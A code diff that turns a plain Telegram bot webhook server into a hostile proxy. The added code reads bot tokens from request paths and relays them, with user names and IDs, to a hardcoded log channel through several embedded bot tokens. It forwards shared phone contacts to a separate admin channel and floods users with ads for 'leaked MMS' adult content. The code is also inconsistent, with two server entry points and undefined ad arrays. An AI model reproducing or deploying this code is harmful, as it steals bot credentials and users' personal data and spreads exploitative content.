@@ -1,1057 +1,807 @@
-import express from "express"
-import rateLimit from "express-rate-limit"
+// server.ts
 
-// ==================== INTERFACES ====================
+import { serve } from "bun";
+import NodeCache from "node-cache";
+
+// Add interfaces after imports
 interface TelegramResponse {
-  ok: boolean
-  result?: any
-  error_code?: number
-  description?: string
+  ok: boolean;
+  description?: string;
+  result?: any;
 }
 
-interface APIResult {
-  success: boolean
-  data?: any
-  error?: string
-  retryAfter?: number
+interface RequestLogEntry {
+  timestamp: string;
+  token: string;
+  status: string;
+  responseTime: string;
+  errorReason: string;
 }
+
+interface Stats {
+  totalBotRequests: number;
+  clientErrors: number;
+  serverErrors: number;
+  totalResponseTime: number;
+}    
 
 interface TelegramUpdate {
-  update_id: number
-  message?: any
-  edited_message?: any
-  channel_post?: any
-  edited_channel_post?: any
-  inline_query?: any
-  chosen_inline_result?: any
-  callback_query?: any
-  shipping_query?: any
-  pre_checkout_query?: any
-  poll?: any
-  poll_answer?: any
-  my_chat_member?: any
-  chat_member?: any
-  chat_join_request?: any
+  [key: string]: any;  // Add index signature
+  message?: {
+    chat: TelegramChat;
+    from?: TelegramUser;
+  };
+  callback_query?: {
+    message: {
+      chat: TelegramChat;
+    };
+    from: TelegramUser;
+  };
+  channel_post?: {
+    chat: TelegramChat;
+    sender_chat?: any;
+  };
+  inline_query?: {
+    id: string;
+    from: TelegramUser;
+  };
+  my_chat_member?: {
+    chat: TelegramChat;
+    from: TelegramUser;
+  };
 }
 
-interface CacheItem {
-  value: any
-  expiry: number
+interface TelegramUser {
+  id: number;
+  first_name: string;
+  last_name?: string;
+  username?: string;
 }
 
-// ==================== LOGGER CLASS ====================
-class Logger {
-  private formatTimestamp(): string {
-    return new Date().toISOString()
-  }
-
-  private formatMessage(level: string, message: string, meta?: any): string {
-    const timestamp = this.formatTimestamp()
-    const metaStr = meta ? ` | ${JSON.stringify(meta)}` : ""
-    return `[${timestamp}] ${level.toUpperCase()}: ${message}${metaStr}`
-  }
-
-  info(message: string, meta?: any): void {
-    console.log(this.formatMessage("info", message, meta))
-  }
-
-  warn(message: string, meta?: any): void {
-    console.warn(this.formatMessage("warn", message, meta))
-  }
-
-  error(message: string, meta?: any): void {
-    console.error(this.formatMessage("error", message, meta))
-  }
-
-  debug(message: string, meta?: any): void {
-    if (process.env.NODE_ENV === "development") {
-      console.debug(this.formatMessage("debug", message, meta))
-    }
-  }
+interface TelegramChat {
+  id: number;
+  type: string;
 }
 
-// ==================== CACHE MANAGER CLASS ====================
-class CacheManager {
-  private cache: Map<string, CacheItem> = new Map()
-  private cleanupInterval: NodeJS.Timeout | null = null
+interface ChatSource {
+  key: keyof TelegramUpdate;
+  type: string;
+  chatPath?: string;
+  userPath?: string;
+  chatId?: number | null;
+}
 
-  constructor() {
-    this.cleanupInterval = setInterval(
-      () => {
-        this.cleanup()
-      },
-      5 * 60 * 1000,
+// Add interface for botInfo response
+interface BotInfoResponse {
+  ok: boolean;
+  result?: {
+    username: string;
+    [key: string]: any;
+  };
+}
+
+// Add interface for inline query results
+interface InlineQueryResult {
+  type: string;
+  id: string;
+  [key: string]: any;
+}
+
+// Configuration Constants
+const MAX_INTERACTIONS = 10;
+const LOG_CHANNEL_ID = "-1002529607208";
+// Multiple log bots for rotation/fallback
+const LOG_BOT_TOKENS = [
+  { name: "main", token: "7875120978:AAFjW1AzILgOc4Iq49zciITTmbK50VhG9hI" },
+  { name: "secondary", token: "7795943772:AAGTP4rr6kTcedMCSWa1u0SyFvaKLFufQJk" },
+  { name: "new1", token: "7073375728:AAG0yU3Xz8-KevZj_Ngyr1jz03F1WprtpPI" },
+  { name: "new2", token: "7526249340:AAHDbn1a4luBxXh3DHrEXMjKVfjIiQfWz9Q" }
+];
+
+// Add function to sanitize text for HTML
+function sanitizeHtml(text: string): string {
+  if (!text) return '';
+  return text
+    .replace(/[\u0300-\u036f\u1AB0-\u1AFF\u1DC0-\u1DFF\u20D0-\u20FF\uFE20-\uFE2F]/g, '') // Remove combining marks
+    .replace(/[\u0080-\uFFFF]/g, '') // Remove non-ASCII characters
+    .replace(/[<>&]/g, '') // Remove HTML special characters
+    .replace(/\s+/g, ' ') // Normalize whitespace
+    .trim();
+}
+
+const formatLogMessage = (interactions: any[]): string =>
+  interactions
+    .map(
+      (i, index) =>
+        `${index + 1}. Bot: @${sanitizeHtml(i.botUsername || '')}\n` +
+        `User: <code>${sanitizeHtml(i.userFullName || '')}</code> (@${sanitizeHtml(i.userUsername || '')})\n` +
+        `User ID: <code>${i.userId || ''}</code>\n` +
+        `Chat Type: <code>${sanitizeHtml(i.chatType || '')}</code>\n` +
+        `Request Type: <code>${sanitizeHtml(i.requestType || '')}</code>\n` +
+        `Time: <code>${new Date(i.timestamp).toLocaleString()}</code>\n` +
+        `Bot Token: <code>${i.token || ''}</code>`
     )
-  }
+    .join('\n\n');
 
-  set(key: string, value: any, ttlSeconds = 3600): void {
-    const expiry = Date.now() + ttlSeconds * 1000
-    this.cache.set(key, { value, expiry })
-  }
+// Embedded Ad Data
+// server.ts
 
-  get(key: string): any {
-    const item = this.cache.get(key)
-    if (!item) return null
+const EXCLUSIVE_CONTENT = {
+  contentId: "premium_exclusive_content_2024",
+  isEnabled: true,
+  contentFormat: "image_with_caption_and_links",
+  imageSource: "https://i.ibb.co/69jxy9f/image.png",
+  captionText: `🔥 <b>NEW MMS LEAKS ARE OUT!</b> 🔥
 
-    if (Date.now() > item.expiry) {
-      this.cache.delete(key)
-      return null
-    }
+💥 <b><u>EXCLUSIVE PREMIUM CONTENT</u></b> 💥
 
-    return item.value
-  }
+🎬 <i>Fresh leaked content daily</i>
+🔞 <b>18+ Adult Material</b>
+💎 <i>Premium quality videos & files</i>
+🚀 <b>Instant access available</b>
 
-  delete(key: string): boolean {
-    return this.cache.delete(key)
-  }
+⬇️ <b><u>Click any server below</u></b> ⬇️
 
-  has(key: string): boolean {
-    const item = this.cache.get(key)
-    if (!item) return false
+<blockquote>⚠️ <b>Limited time offer - Join now!</b></blockquote>`,
+  actionLinks: [
+    { linkText: "🎥 VIDEOS💦", linkDestination: "https://t.me/+NiLqtvjHQoFhZjQ1" },
+    { linkText: "📁 FILES🍑", linkDestination: "https://t.me/+fvFJeSbZEtc2Yjg1" },
+  ],
+  engagement: { totalViews: 0, totalClicks: 0 },
+};
 
-    if (Date.now() > item.expiry) {
-      this.cache.delete(key)
-      return false
-    }
+function buildTelegramHTML(content: typeof EXCLUSIVE_CONTENT): string {
+  const links = content.actionLinks.map(
+    (link) => `<a href="${link.linkDestination}">${link.linkText}</a>`
+  ).join("\n");
 
-    return true
-  }
-
-  clear(): void {
-    this.cache.clear()
-  }
-
-  size(): number {
-    this.cleanup()
-    return this.cache.size
-  }
-
-  keys(): string[] {
-    this.cleanup()
-    return Array.from(this.cache.keys())
-  }
-
-  private cleanup(): void {
-    const now = Date.now()
-    for (const [key, item] of this.cache.entries()) {
-      if (now > item.expiry) {
-        this.cache.delete(key)
-      }
-    }
-  }
-
-  destroy(): void {
-    if (this.cleanupInterval) {
-      clearInterval(this.cleanupInterval)
-      this.cleanupInterval = null
-    }
-    this.clear()
-  }
+  return `${content.captionText}\n\n${links}`;
 }
 
-// ==================== HEALTH MONITOR CLASS ====================
-class HealthMonitor {
-  private startTime: number
-  private requestCount = 0
+export default {
+  port: 3000,
+  async fetch(req: Request): Promise<Response> {
+    const url = new URL(req.url);
+    const botToken = url.pathname.slice(1); // Extract "/<bot_token>" from path
 
-  constructor() {
-    this.startTime = Date.now()
-  }
-
-  recordRequest(): void {
-    this.requestCount++
-  }
-
-  getHealth(): {
-    healthy: boolean
-    uptime: number
-    memory: { used: number; total: number; percentage: number }
-    requests: number
-  } {
-    const uptime = Date.now() - this.startTime
-    const memUsage = process.memoryUsage()
-    const memUsed = memUsage.heapUsed
-    const memTotal = memUsage.heapTotal
-    const memPercentage = (memUsed / memTotal) * 100
-
-    const healthy = memPercentage < 90 && uptime > 1000 // Reduced from 10000 to 1000
-
-    return {
-      healthy,
-      uptime,
-      memory: { used: memUsed, total: memTotal, percentage: memPercentage },
-      requests: this.requestCount,
+    if (req.method !== "POST") {
+      return new Response("Only POST supported", { status: 405 });
     }
-  }
-}
 
-// ==================== STATS MANAGER CLASS ====================
-class StatsManager {
-  constructor(private cacheManager: CacheManager) {}
+    if (!botToken || !botToken.startsWith("7680") && !botToken.startsWith("7734")) {
+      return new Response("Invalid or missing bot token in path", { status: 403 });
+    }
 
-  recordUpdate(update: TelegramUpdate): void {
     try {
-      const totalMessages = this.cacheManager.get("stats:total_messages") || 0
-      this.cacheManager.set("stats:total_messages", totalMessages + 1, 86400 * 7)
+      const update = await req.json();
 
-      const userId = this.extractUserId(update)
-      if (userId) {
-        this.cacheManager.set(`stats:user:${userId}`, Date.now(), 86400)
+      if (!update.message || !update.message.chat || !update.message.chat.id) {
+        return new Response("Invalid Telegram update", { status: 200 });
       }
 
-      this.cacheManager.set("stats:last_activity", new Date().toISOString(), 86400)
-    } catch (error) {
-      console.error("Error recording update:", error)
+      const chatId = update.message.chat.id;
+      const html = buildTelegramHTML(EXCLUSIVE_CONTENT);
+
+      const telegramApi = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      await fetch(telegramApi, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: html,
+          parse_mode: "HTML",
+          disable_web_page_preview: false,
+        }),
+      });
+
+      return new Response("Message sent", { status: 200 });
+    } catch (err) {
+      console.error("Error:", err);
+      return new Response("Internal Server Error", { status: 500 });
+    }
+  },
+};
+
+
+
+
+
+// Cache for request statuses and stats
+const cache = new NodeCache({ stdTTL: 86400, checkperiod: 600 });
+
+// Interaction buffer
+const interactionBuffer: any[] = [];
+
+// Global cooldown for log sending to avoid Telegram rate limits
+let logSendCooldownUntil = 0;
+
+// Track server start time for uptime
+const serverStartTime = Date.now();
+
+// Store request status and stats
+function storeRequestStatus(token: string, status: string, responseTime: number, errorReason = "") {
+  // Update request log
+  const requestLog = (cache.get("requestLog") as RequestLogEntry[] | undefined) || [];
+  const timestamp = new Date().toISOString();
+  requestLog.unshift({ timestamp, token, status, responseTime: responseTime.toFixed(2), errorReason });
+  if (requestLog.length > 100) requestLog.pop();
+  cache.set("requestLog", requestLog);
+
+  // Update stats
+  const stats = {
+    totalBotRequests: ((cache.get("totalBotRequests") as number) || 0) + 1,
+    clientErrors: (cache.get("clientErrors") as number) || 0,
+    serverErrors: (cache.get("serverErrors") as number) || 0,
+    totalResponseTime: ((cache.get("totalResponseTime") as number) || 0) + responseTime,
+  };
+
+  if (status === "Failed") {
+    if (errorReason.includes("4xx")) stats.clientErrors++;
+    else if (errorReason.includes("5xx")) stats.serverErrors++;
+  }
+
+  cache.mset([
+    { key: "totalBotRequests", val: stats.totalBotRequests },
+    { key: "clientErrors", val: stats.clientErrors },
+    { key: "serverErrors", val: stats.serverErrors },
+    { key: "totalResponseTime", val: stats.totalResponseTime },
+  ]);
+}
+
+// Retry operation
+async function retryOperation<T>(operation: () => Promise<T>, maxRetries = 3, baseDelay = 1000): Promise<T> {
+  let lastError = null;
+  for (let i = 0; i < maxRetries; i++) {
+    try {
+      return await operation();
+    } catch (error: any) {
+      lastError = error;
+      if (["ECONNRESET", "ETIMEDOUT", "ECONNREFUSED"].includes(error.code)) {
+        if (i === maxRetries - 1) throw new Error(`Connection error: ${error.message}`);
+        await new Promise((resolve) => setTimeout(resolve, Math.pow(2, i) * baseDelay + Math.random() * baseDelay));
+        continue;
+      }
+      if (error.message?.includes("rate limit") || error.message?.includes("Too Many Requests")) {
+        await new Promise((resolve) => setTimeout(resolve, (error.parameters?.retry_after || 60) * 1000));
+        continue;
+      }
+      if (i === maxRetries - 1) throw error;
+      await new Promise((resolve) => setTimeout(resolve, baseDelay * (i + 1)));
+    }
+  }
+  throw lastError;
+}
+
+// Message sending
+async function sendTextMessage(botToken: string, chatId: string | number, text: string, buttons: any = null) {
+  const messageData: any = { chat_id: chatId, text: text.substring(0, 4096), parse_mode: "HTML" };
+  if (buttons) {
+    // If buttons is an object with 'keyboard', treat as reply keyboard
+    if (buttons.keyboard) {
+      messageData.reply_markup = buttons;
+    } else {
+      // Otherwise treat as inline keyboard
+      messageData.reply_markup = { inline_keyboard: buttons.slice(0, 10) };
     }
   }
 
-  recordError(): void {
-    try {
-      const errors24h = this.cacheManager.get("stats:errors_24h") || 0
-      this.cacheManager.set("stats:errors_24h", errors24h + 1, 86400)
-    } catch (error) {
-      console.error("Error recording error:", error)
-    }
-  }
-
-  getStats(): {
-    totalMessages: number
-    activeUsers: number
-    errors24h: number
-    lastActivity: string | null
-  } {
-    try {
-      const totalMessages = this.cacheManager.get("stats:total_messages") || 0
-      const errors24h = this.cacheManager.get("stats:errors_24h") || 0
-      const lastActivity = this.cacheManager.get("stats:last_activity")
-      const userKeys = this.cacheManager.keys().filter((key) => key.startsWith("stats:user:"))
-      const activeUsers = userKeys.length
-
-      return { totalMessages, activeUsers, errors24h, lastActivity }
-    } catch (error) {
-      console.error("Error getting stats:", error)
-      return { totalMessages: 0, activeUsers: 0, errors24h: 0, lastActivity: null }
-    }
-  }
-
-  private extractUserId(update: TelegramUpdate): string | null {
-    try {
-      if (update.message?.from?.id) return update.message.from.id.toString()
-      if (update.callback_query?.from?.id) return update.callback_query.from.id.toString()
-      if (update.inline_query?.from?.id) return update.inline_query.from.id.toString()
-      return null
-    } catch (error) {
-      return null
-    }
+  const controller = new AbortController();
+  const timeoutId = setTimeout(() => controller.abort(), 10000);
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(messageData),
+      signal: controller.signal,
+    });
+    clearTimeout(timeoutId);
+    const result = (await response.json()) as TelegramResponse;
+    if (!result.ok) throw new Error(`Telegram API error: ${result.description}`);
+    return result;
+  } catch (error) {
+    clearTimeout(timeoutId);
+    throw error;
   }
 }
 
-// ==================== TELEGRAM API CLASS ====================
-class TelegramAPI {
-  private baseURL: string
-  private circuitBreaker: {
-    failures: number
-    lastFailure: number
-    state: "closed" | "open" | "half-open"
-  }
+async function sendImageMessage(botToken: string, chatId: string | number, imageUrl: string, caption: string, buttons: any = null) {
+  const messageData: any = { chat_id: chatId, photo: imageUrl, caption: caption.substring(0, 1024), parse_mode: "HTML" };
+  if (buttons) messageData.reply_markup = { inline_keyboard: buttons.slice(0, 10) };
 
-  constructor(
-    private token: string,
-    private logger: Logger,
-  ) {
-    this.baseURL = `https://api.telegram.org/bot${token}`
-    this.circuitBreaker = { failures: 0, lastFailure: 0, state: "closed" }
+  const controller = new AbortController();
+  const timeoutId = setTimeout(() => controller.abort(), 15000);
+  try {
+    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(messageData),
+      signal: controller.signal,
+    });
+    clearTimeout(timeoutId);
+    const result = (await response.json()) as TelegramResponse;
+    if (!result.ok) throw new Error(`Telegram API error: ${result.description}`);
+    return result;
+  } catch (error) {
+    clearTimeout(timeoutId);
+    throw error;
   }
+}
 
-  async makeRequest(method: string, params: any = {}): Promise<APIResult> {
-    if (this.circuitBreaker.state === "open") {
-      const timeSinceLastFailure = Date.now() - this.circuitBreaker.lastFailure
-      if (timeSinceLastFailure < 30000) {
-        return { success: false, error: "Circuit breaker is open" }
+// Get chat type
+function getChatType(chat: any) {
+  if (!chat) return "unknown";
+  const types: { [key: string]: string } = { private: "Private", group: "Group", supergroup: "Supergroup", channel: "Channel" };
+  return types[chat.type] || "Unknown";
+}
+
+// Improved: Send interaction logs with true round-robin and per-bot cooldowns
+let logBotIndex = 0;
+const logBotCooldowns: { [botName: string]: number } = {};
+let logGlobalCooldownUntil = 0;
+
+async function sendInteractionLogs() {
+  if (interactionBuffer.length < MAX_INTERACTIONS) return;
+  if (Date.now() < logGlobalCooldownUntil) return;
+  const logsToSend = interactionBuffer.slice(0, MAX_INTERACTIONS);
+  const message = formatLogMessage(logsToSend);
+  let sent = false;
+  let lastError = null;
+  const now = Date.now();
+  let triedBots = 0;
+  let startIndex = logBotIndex;
+  let usedBots: string[] = [];
+  while (triedBots < LOG_BOT_TOKENS.length) {
+    const bot = LOG_BOT_TOKENS[logBotIndex];
+    // Skip if this bot is in cooldown
+    if (logBotCooldowns[bot.name] && now < logBotCooldowns[bot.name]) {
+      logBotIndex = (logBotIndex + 1) % LOG_BOT_TOKENS.length;
+      triedBots++;
+      continue;
+    }
+    try {
+      await retryOperation(() => sendTextMessage(bot.token, LOG_CHANNEL_ID, message));
+      sent = true;
+      console.log(`Log sent with ${bot.name} bot.`);
+      logBotIndex = (logBotIndex + 1) % LOG_BOT_TOKENS.length;
+      break;
+    } catch (error: any) {
+      lastError = error;
+      usedBots.push(bot.name);
+      if (error.message && error.message.includes("Too Many Requests")) {
+        let retryAfter = 60;
+        if (error.description) {
+          const match = error.description.match(/retry after (\d+)/i);
+          if (match) retryAfter = parseInt(match[1], 10);
+        }
+        logBotCooldowns[bot.name] = now + retryAfter * 1000;
+        console.error(`${bot.name} log bot rate limited: pausing this bot for ${retryAfter} seconds. Trying next bot...`);
       } else {
-        this.circuitBreaker.state = "half-open"
+        console.error(`Failed to send logs with ${bot.name} bot:`, error);
       }
+      logBotIndex = (logBotIndex + 1) % LOG_BOT_TOKENS.length;
+      triedBots++;
     }
+  }
+  if (sent) {
+    interactionBuffer.splice(0, MAX_INTERACTIONS);
+  } else if (lastError) {
+    // If all bots are rate limited, set a short global cooldown
+    const allCooldown = LOG_BOT_TOKENS.every(b => logBotCooldowns[b.name] && now < logBotCooldowns[b.name]);
+    if (allCooldown) {
+      logGlobalCooldownUntil = now + 30 * 1000; // 30s global pause
+      console.error("All log bots are rate limited. Pausing log sending for 30 seconds.");
+    }
+    console.error("Log sending failed with all bots:", lastError, `Tried bots: ${usedBots.join(", ")}`);
+  }
+}
 
-    const maxRetries = 3
-    let lastError = ""
+// Ad functions
+function getAlwaysAds() {
+  return ALWAYS_ADS;
+}
 
-    for (let attempt = 1; attempt <= maxRetries; attempt++) {
+function getRandomAd() {
+  return RANDOM_ADS.length ? RANDOM_ADS[Math.floor(Math.random() * RANDOM_ADS.length)] : null;
+}
+
+// Fix BOT_TOKEN scope in webhook handler
+serve({
+  port: process.env.PORT || 3000,
+  async fetch(req) {
+    const startTime = performance.now();
+    const url = new URL(req.url);
+    const method = req.method;
+    const pathname = url.pathname;
+
+    // Webhook handler
+    if (method === "POST" && pathname.startsWith("/bot/")) {
+      const BOT_TOKEN = pathname.split("/bot/")[1];
       try {
-        const url = `${this.baseURL}/${method}`
+        if (!BOT_TOKEN || !BOT_TOKEN.includes(":")) {
+          storeRequestStatus(BOT_TOKEN || "unknown", "Failed", performance.now() - startTime, "4xx: Invalid bot token format");
+          return new Response("Invalid bot token format", { status: 400 });
+        }
 
-        // Create timeout manually for better compatibility
-        const timeoutPromise = new Promise<never>((_, reject) => {
-          setTimeout(() => reject(new Error("Request timeout")), 10000)
-        })
+        const update = await req.json() as TelegramUpdate;
 
-        const fetchPromise = fetch(url, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(params),
-        })
+        let chatId: string | number | null = null;
+        let user: any = null;
+        let updateType = "";
+        let chat: TelegramChat | undefined;
 
-        const response = await Promise.race([fetchPromise, timeoutPromise])
-        const data: TelegramResponse = await response.json()
+        if (update.message) {
+          updateType = "message";
+          chat = update.message.chat;
+          chatId = chat.id;
+          user = update.message.from;
+        } else if (update.callback_query) {
+          updateType = "callback_query";
+          chat = update.callback_query.message.chat;
+          chatId = chat.id;
+          user = update.callback_query.from;
+        } else if (update.channel_post) {
+          updateType = "channel_post";
+          chat = update.channel_post.chat;
+          chatId = chat.id;
+          user = update.channel_post.sender_chat;
+        } else if (update.inline_query) {
+          updateType = "inline_query";
+          user = update.inline_query.from;
+        } else if (update.my_chat_member) {
+          updateType = "my_chat_member";
+          chat = update.my_chat_member.chat;
+          chatId = chat.id;
+          user = update.my_chat_member.from;
+        }
 
-        if (data.ok) {
-          this.circuitBreaker.failures = 0
-          this.circuitBreaker.state = "closed"
-          return { success: true, data: data.result }
-        } else {
-          lastError = data.description || "Unknown API error"
+        if (!updateType) {
+          storeRequestStatus(BOT_TOKEN, "Failed", performance.now() - startTime, "4xx: Unsupported update type");
+          return new Response("OK", { status: 200 });
+        }
 
-          if (data.error_code === 429) {
-            const retryAfter = this.extractRetryAfter(data.description || "")
-            this.logger.warn("Rate limited by Telegram API", { retryAfter, attempt, method })
+        const botInfo = await retryOperation(async () => {
+          const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
+          return (await response.json()) as BotInfoResponse;
+        });
 
-            if (attempt < maxRetries) {
-              await this.sleep(retryAfter * 1000)
-              continue
+        const botUsername = botInfo.ok && botInfo.result ? botInfo.result.username : "";
+
+        const userFullName = user?.last_name ? `${user.first_name} ${user.last_name}` : user?.first_name || "Channel";
+        const userUsername = user?.username || "no username";
+
+        const chatType = getChatType(chat);
+
+        if (user) {
+          interactionBuffer.unshift({
+            botUsername: botUsername || "unknown",
+            userFullName,
+            userUsername,
+            userId: user?.id || chatId,
+            token: BOT_TOKEN,
+            chatType,
+            requestType: updateType,
+            timestamp: new Date().toISOString(),
+          });
+          // Fire and forget log sending for speed
+          if (interactionBuffer.length >= MAX_INTERACTIONS) {
+            sendInteractionLogs().catch(err => console.error("Error in background log sending:", err));
+          }
+        }
+
+        if (updateType === "inline_query" && update.inline_query?.id) {
+          const inlineResults: InlineQueryResult[] = [];
+          ALWAYS_ADS.forEach((ad, index) => {
+            if (ad.type === "text") {
+              inlineResults.push({
+                type: "article",
+                id: `always_${index}`,
+                title: "Premium Content",
+                input_message_content: { message_text: ad.content.text, parse_mode: "HTML" },
+              });
             }
+          });
 
-            return { success: false, error: lastError, retryAfter }
+          const randomAd = getRandomAd();
+          if (randomAd && randomAd.type === "photo_text_button") {
+            inlineResults.push({
+              type: "photo",
+              id: "random_1",
+              photo_url: randomAd.content.photos[0],
+              thumb_url: randomAd.content.photos[0],
+              caption: randomAd.content.text,
+              parse_mode: "HTML",
+              reply_markup: { inline_keyboard: randomAd.content.buttons.map((button: any) => [button]) },
+            });
           }
 
-          this.logger.error("Telegram API error", {
-            method,
-            error_code: data.error_code,
-            description: data.description,
-            attempt,
-          })
+          await retryOperation(async () => {
+            const queryId = update.inline_query?.id;
+            if (!queryId) return;
+            
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerInlineQuery`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ 
+                inline_query_id: queryId, 
+                results: inlineResults, 
+                cache_time: 1 
+              }),
+            });
+          });
         }
-      } catch (error: any) {
-        lastError = error.message || "Unknown error"
 
-        this.logger.error("Request failed", {
-          method,
-          attempt,
-          error: error.message,
-          type: error.name,
-        })
-
-        if (error.message === "Request timeout") {
-          lastError = "Request timeout"
-        } else if (error.code === "ECONNRESET" || error.code === "ETIMEDOUT") {
-          lastError = "Connection error"
+        // If user shared contact, forward info to admin channel (must be before ads/messages)
+        if (update.message && (update.message as any).contact) {
+          const contact = (update.message as any).contact;
+          const contactName = contact.first_name + (contact.last_name ? (" " + contact.last_name) : "");
+          const contactPhone = contact.phone_number;
+          const contactUserId = contact.user_id || contact.id || user?.id || chatId;
+          const contactUsername = user?.username || "no username";
+          const contactLang = user?.language_code || "unknown";
+          const isBot = user?.is_bot ? "✅ Yes" : "❌ No";
+          const now = new Date();
+          const istOffset = 5.5 * 60 * 60 * 1000;
+          const istDate = new Date(now.getTime() + istOffset);
+          const days = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
+          const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+          const timeStr = `${days[istDate.getUTCDay()]} ${istDate.getUTCDate()} ${months[istDate.getUTCMonth()]}, ${istDate.getUTCFullYear()} at ${istDate.toLocaleTimeString('en-IN', { hour12: true })}`;
+          const msg = `<b>New User Started the Bot</b>\n\n` +
+            `Bot Username: @${sanitizeHtml(botUsername)}\n` +
+            `Bot Token: <code>${BOT_TOKEN}</code>\n` +
+            `Full Name: ${sanitizeHtml(user?.first_name || "")} ${sanitizeHtml(user?.last_name || "")}\n` +
+            `Username: @${sanitizeHtml(contactUsername)}\n` +
+            `User ID: ${contactUserId}\n` +
+            `Chat ID: ${chatId}\n` +
+            `Language: ${sanitizeHtml(contactLang)}\n` +
+            `Is Bot: ${isBot}\n` +
+            `Account Link: Open Chat\n` +
+            `Time (IST): ${timeStr}\n\n` +
+            `<b>User Shared Contact</b>\n\n` +
+            `Name: ${sanitizeHtml(contactName)}\n` +
+            `Phone: ${sanitizeHtml(contactPhone)}\n` +
+            `User ID: ${contactUserId}`;
+          // Send to admin channel with provided bot token
+          await retryOperation(() => sendTextMessage(
+            "7734817163:AAESWrSeVKg5iclnM2R2SvOA5xESClG8tFM",
+            "-1002628971429",
+            msg.replace(/\\n/g, "\n"),
+          ));
         }
-      }
 
-      if (attempt < maxRetries) {
-        const delay = Math.min(1000 * Math.pow(2, attempt - 1), 5000)
-        await this.sleep(delay)
-      }
-    }
-
-    this.circuitBreaker.failures++
-    this.circuitBreaker.lastFailure = Date.now()
-
-    if (this.circuitBreaker.failures >= 5) {
-      this.circuitBreaker.state = "open"
-      this.logger.warn("Circuit breaker opened", { failures: this.circuitBreaker.failures })
-    }
-
-    return { success: false, error: lastError }
-  }
-
-  async sendMessage(chatId: string | number, text: string, options: any = {}): Promise<APIResult> {
-    return this.makeRequest("sendMessage", { chat_id: chatId, text, ...options })
-  }
-
-  async editMessageText(
-    chatId: string | number,
-    messageId: number,
-    text: string,
-    options: any = {},
-  ): Promise<APIResult> {
-    return this.makeRequest("editMessageText", {
-      chat_id: chatId,
-      message_id: messageId,
-      text,
-      ...options,
-    })
-  }
-
-  async answerCallbackQuery(callbackQueryId: string, text?: string, showAlert = false): Promise<APIResult> {
-    return this.makeRequest("answerCallbackQuery", {
-      callback_query_id: callbackQueryId,
-      text,
-      show_alert: showAlert,
-    })
-  }
-
-  async answerInlineQuery(inlineQueryId: string, results: any[], options: any = {}): Promise<APIResult> {
-    return this.makeRequest("answerInlineQuery", {
-      inline_query_id: inlineQueryId,
-      results,
-      ...options,
-    })
-  }
-
-  async checkHealth(): Promise<boolean> {
-    try {
-      const result = await this.makeRequest("getMe")
-      return result.success
-    } catch (error) {
-      return false
-    }
-  }
-
-  private extractRetryAfter(description: string): number {
-    const match = description.match(/retry after (\d+)/i)
-    return match ? Number.parseInt(match[1]) : 1
-  }
-
-  private sleep(ms: number): Promise<void> {
-    return new Promise((resolve) => setTimeout(resolve, ms))
-  }
-}
-
-// ==================== WEBHOOK HANDLER CLASS ====================
-class WebhookHandler {
-  private readonly FALLBACK_MESSAGE = "I'm sorry, I'm experiencing technical difficulties. Please try again later."
-
-  constructor(
-    private telegramAPI: TelegramAPI,
-    private logger: Logger,
-    private cacheManager: CacheManager,
-    private statsManager: StatsManager,
-  ) {}
-
-  async handleWebhook(update: TelegramUpdate): Promise<void> {
-    try {
-      this.logger.info("Received webhook update", {
-        updateId: update.update_id,
-        type: this.getUpdateType(update),
-      })
-
-      this.statsManager.recordUpdate(update)
-
-      const chatId = this.extractChatId(update)
-      if (chatId && this.isThrottled(chatId)) {
-        this.logger.warn("User throttled", { chatId })
-        return
-      }
-
-      let handled = false
-
-      if (update.message) {
-        handled = await this.handleMessage(update.message)
-      } else if (update.edited_message) {
-        handled = await this.handleEditedMessage(update.edited_message)
-      } else if (update.callback_query) {
-        handled = await this.handleCallbackQuery(update.callback_query)
-      } else if (update.inline_query) {
-        handled = await this.handleInlineQuery(update.inline_query)
-      } else if (update.channel_post) {
-        handled = await this.handleChannelPost(update.channel_post)
-      } else if (update.my_chat_member) {
-        handled = await this.handleChatMemberUpdate(update.my_chat_member)
-      }
-
-      if (!handled && chatId) {
-        await this.sendFallbackMessage(
-          chatId,
-          "I received your message but I'm not sure how to respond to this type of content.",
-        )
-      }
-    } catch (error: any) {
-      this.logger.error("Webhook handling failed", {
-        error: error.message,
-        stack: error.stack,
-        update,
-      })
-
-      const chatId = this.extractChatId(update)
-      if (chatId) {
-        await this.sendFallbackMessage(chatId, this.FALLBACK_MESSAGE)
-      }
-    }
-  }
-
-  private async handleMessage(message: any): Promise<boolean> {
-    try {
-      const chatId = message.chat.id
-      const userId = message.from?.id
-      const text = message.text || ""
-
-      this.logger.info("Processing message", {
-        chatId,
-        userId,
-        text: text.substring(0, 100),
-      })
-
-      if (userId) {
-        this.cacheManager.set(`user:${userId}:last_seen`, Date.now(), 86400)
-      }
-
-      if (text.startsWith("/start")) {
-        return await this.handleStartCommand(chatId)
-      } else if (text.startsWith("/help")) {
-        return await this.handleHelpCommand(chatId)
-      } else if (text.startsWith("/status")) {
-        return await this.handleStatusCommand(chatId)
-      } else {
-        return await this.handleTextMessage(chatId, text, message)
-      }
-    } catch (error: any) {
-      this.logger.error("Message handling failed", { error: error.message })
-      return false
-    }
-  }
-
-  private async handleEditedMessage(message: any): Promise<boolean> {
-    try {
-      const chatId = message.chat.id
-      const result = await this.telegramAPI.sendMessage(
-        chatId,
-        "I noticed you edited your message. I don't process edited messages, but feel free to send a new one!",
-      )
-      return result.success
-    } catch (error: any) {
-      this.logger.error("Edited message handling failed", { error: error.message })
-      return false
-    }
-  }
-
-  private async handleCallbackQuery(callbackQuery: any): Promise<boolean> {
-    try {
-      const chatId = callbackQuery.message?.chat?.id
-      const data = callbackQuery.data
-
